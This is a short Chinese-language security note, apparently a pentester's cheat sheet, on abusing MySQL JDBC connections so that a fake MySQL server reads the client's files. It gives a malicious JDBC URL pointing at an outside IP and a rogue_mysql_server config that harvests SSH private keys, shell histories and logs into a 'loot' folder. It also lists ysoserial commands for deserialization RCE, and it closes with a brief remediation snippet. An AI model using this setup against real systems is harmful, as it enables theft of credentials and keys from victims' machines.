

## [**MySQL** 服务端恶意读取客户端任意文件漏洞]

<https://cloud.tencent.com/developer/article/1818089>

如果java的mysql的jdbc连接信息可以自定义，可以修改mysql的ip和连接配置如：
```
test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#
jdbc:mysql://47.109.58.205:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#
root
password
```
可以使用下方的项目伪造一个mysql服务，从而读取客户端的文件。
<https://github.com/rmb122/rogue_mysql_server>


^
```
host: 0.0.0.0
port: 3306
version_string: "10.4.13-MariaDB-log"

file_list: ["/root/.bash_history","C:/boot.ini","/var/log/mysqld.log","/etc/os-release","/root/.mysql_history","/etc/issue","/root/.ssh/id_rsa","/var/log","/etc/ssh/sshd_config","/etc/crontab","/root/.ssh/authorized_keys","/root/.ssh/id_rsa.pub"]
save_path: ./loot
always_read: true
from_database_name: false
max_file_size: 0

auth: false
users:
  - root: root
  - root: password

jdbc_exploit: false
always_exploit: false
ysoserial_command:
  cc4: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections4", 'touch /tmp/cc4']
  cc7: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections7", 'touch /tmp/cc7']

```
```
/var/log/mysqld.log 可能有mysql密码
```

## MySQL JDBC RCE 姿势
mysql-connector-java >= 8.0.20, >= 5.1.49 中不可用。
利用的jdbc反序列化RCE。
<https://github.com/mysql/mysql-connector-j/commit/de7e1af306ffbb8118125a865998f64ee5b35b1b>\
<https://github.com/mysql/mysql-connector-j/commit/13f06c38fb68757607c460789196e3f798d506f2>


## **修复**
原生的场景下可以使用预先定义的Properties将URL中的属性覆盖掉，就可以关闭本地文件读取以及URL读取了。

```
String driver = "com.mysql.jdbc.Driver";
String DB_URL = "jdbc:mysql://127.0.0.1:3306/test?user=test&maxAllowedPacket=655360&allowLoadLocalInfile=true";
Class.forName(driver);
Properties properties = new Properties();
properties.setProperty("allowLoadLocalInfile","false");
properties.setProperty("allowUrlInLocalInfile","false");
properties.setProperty("allowLoadLocalInfileInPath","");
Connection conn = DriverManager.getConnection(DB_URL,properties);
```

